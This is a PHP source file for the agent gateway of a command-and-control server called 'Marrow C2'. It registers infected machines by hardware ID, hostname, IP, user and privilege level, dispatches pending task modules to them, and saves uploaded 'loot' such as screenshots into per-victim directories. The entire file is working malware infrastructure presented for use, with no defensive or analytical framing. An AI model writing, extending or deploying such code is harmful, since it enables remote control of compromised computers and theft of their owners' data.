<?php
// Marrow C2 - Fast Agent Gateway
// Optimized for speed - minimal overhead
header('Content-Type: application/json');

require_once __DIR__ . '/../includes/Target.php';
require_once __DIR__ . '/../includes/Task.php';

$target = new Target();
$task = new Task();

$hwid = $_POST['hwid'] ?? null;
$action = $_POST['action'] ?? null;

if (!$hwid || !$action) {
    die(json_encode(['error' => 'Missing params']));
}

switch ($action) {
    case 'checkin':
        $target->checkin(
            $hwid,
            $_POST['hostname'] ?? null,
            $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'],
            $_POST['user'] ?? null,
            $_POST['integrity'] ?? null,
            $_POST['os'] ?? null
        );

        // Get pending task immediately
        $pending = $task->getPending($hwid);
        if ($pending) {
            echo json_encode([
                'status' => 'task',
                'id' => $pending['id'],
                'module' => $pending['module_name'],
                'args' => $pending['command_args']
            ]);
        } else {
            echo json_encode(['status' => 'idle']);
        }
        break;

    case 'report':
        $taskId = $_POST['task_id'] ?? null;
        $result = $_POST['result'] ?? '';

        if ($taskId) {
            $task->complete($taskId, $result);

            // Handle file uploads (screenshots, etc.)
            if (isset($_FILES['file'])) {
                $lootDir = __DIR__ . '/../loot/' . preg_replace('/[^a-zA-Z0-9\-]/', '', $hwid);
                if (!is_dir($lootDir))
                    mkdir($lootDir, 0755, true);

                $filename = time() . '_' . basename($_FILES['file']['name']);
                move_uploaded_file($_FILES['file']['tmp_name'], "$lootDir/$filename");
            }
        }
        echo json_encode(['status' => 'ok']);
        break;

    default:
        echo json_encode(['error' => 'Unknown action']);
}